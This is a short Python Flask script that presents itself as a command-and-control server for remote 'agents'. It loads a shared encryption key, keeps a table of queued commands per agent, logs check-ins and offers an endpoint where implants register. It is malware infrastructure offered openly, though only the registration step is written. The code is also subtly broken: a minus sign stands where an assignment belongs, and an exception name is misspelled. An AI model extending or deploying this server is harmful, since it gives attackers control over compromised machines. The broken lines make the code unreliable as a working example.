from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import datetime
import os

app = Flask(__name__)
KEY - os.getenv("C2_SHARED_KEY")

if not KEY:
    raise RuntimeEror("C2_SHARED_KEY não definida")

fernet = Fernet(KEY.encode())

agents = {}  # {agent_id: {'last_seen': timestamp, 'results': []}}
commands = {}  # {agent_id:['cmd1','cmd2']}

def log_event(event):
    with open('c2_log.txt','a') as f:
        f.write(f"{datetime.datetime.now()} — {event}\n")

@app.route('/register', methods=['POST'])
def register():
    agent_id = request.json.get('agent_id', os.urandom(16).hex())
    agents[agent_id] = {'last_seen': datetime.datetime.now(), 'results': []}
    log_event(f"Registered: {agent_id}")
    return jsonify({'agent_id': agent_id})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

